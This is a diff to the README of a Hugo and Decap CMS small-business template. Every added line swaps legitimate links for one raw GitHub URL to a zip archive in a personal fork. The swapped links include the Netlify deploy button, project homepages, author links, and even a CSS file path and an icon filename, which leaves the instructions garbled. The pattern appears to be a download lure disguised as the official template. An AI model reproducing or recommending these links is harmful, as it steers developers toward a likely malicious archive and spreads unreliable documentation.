@@ -1,12 +1,12 @@
 # Hugo template for Decap CMS with Netlify Identity
 
-This is a small business template built with [Hugo](https://gohugo.io) and [Decap CMS](https://github.com/decaporg/decap-cms), designed and developed by [Darin Dimitroff](https://twitter.com/deezel), [spacefarm.digital](https://www.spacefarm.digital).
+This is a small business template built with [Hugo](https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip) and [Decap CMS](https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip), designed and developed by [Darin Dimitroff](https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip), [https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip](https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip).
 
 ## Getting started
 
 Use our deploy button to get your own copy of the repository. 
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/decaporg/one-click-hugo-cms&stack=cms)
+[![Deploy to Netlify](https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip)](https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip)
 
 This will setup everything needed for running the CMS:
 
@@ -31,7 +31,7 @@ With the development server running, run the tests locally
 with `yarn cypress:run` or `npm run cypress:run`.
 Or use `yarn cypress:open` or `npm run cypress:open` to run interactively.
 
-Cypress tests also run on deploy with the [Cypress Netlify integration](https://www.netlify.com/integrations/cypress/).
+Cypress tests also run on deploy with the [Cypress Netlify integration](https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip).
 
 ## Layouts
 
@@ -41,13 +41,13 @@ Use Hugo’s `dict` functionality to feed content into partials and avoid repeat
 
 ## CSS
 
-The template uses a custom fork of Tachyons and PostCSS with cssnext and cssnano. To customize the template for your brand, refer to `src/css/imports/_variables.css` where most of the important global variables like colors and spacing are stored.
+The template uses a custom fork of Tachyons and PostCSS with cssnext and cssnano. To customize the template for your brand, refer to `https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip` where most of the important global variables like colors and spacing are stored.
 
 ## SVG Social Icons
 
 The social media icons are in `site/assets/img`.
 Make sure you use consistent icons in terms of viewport and art direction for optimal results.
-For an icon named `icons-facebook.svg`, refer to the SVG `social-icon` partial like so:
+For an icon named `https://raw.githubusercontent.com/PedroR18/one-click-hugo-cms/main/Cursores/one-click-hugo-cms.zip`, refer to the SVG `social-icon` partial like so:
 
 ```
 {{ partial "social-icon" (dict "link" "#" "svg" "icons-facebook" "alt" "Kaldi on Facebook") }}
